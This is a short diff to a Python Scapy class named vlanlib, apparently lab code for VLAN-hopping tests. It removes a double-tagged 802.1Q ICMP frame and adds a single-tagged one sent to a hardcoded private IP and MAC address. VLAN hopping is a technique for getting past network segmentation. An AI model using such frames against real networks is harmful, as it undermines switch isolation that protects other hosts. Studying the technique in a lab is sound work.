@@ -10,11 +10,15 @@ class vlanlib:
 	host_arp=''
 	def __init__(self,target_ip='0.0.0.0'):
 		self.target_ip=target_ip
+		#print target_ip
 		self.target_arp=getmacbyip(target_ip)
 		self.host_ip=get_ip_address('eth0')
 		self.host_arp=get_mac_address()
 	def run_vlanhopping(self):
-		packet=Ether(dst=self.target_arp)/Dot1Q(vlan=1)/Dot1Q(vlan=2)/IP(dst=self.target_ip)/ICMP()
+		self.target_arp="cc:01:1a:e0:00:00"
+		self.target_ip="192.168.237.222"
+		packet=Ether(dst=self.target_arp,src=self.host_arp)/Dot1Q(vlan=2)/IP(dst=self.target_ip)/\
+		ICMP(id=0x0854,seq=0x0001)
 		sendp(packet,iface='eth0')
 
 
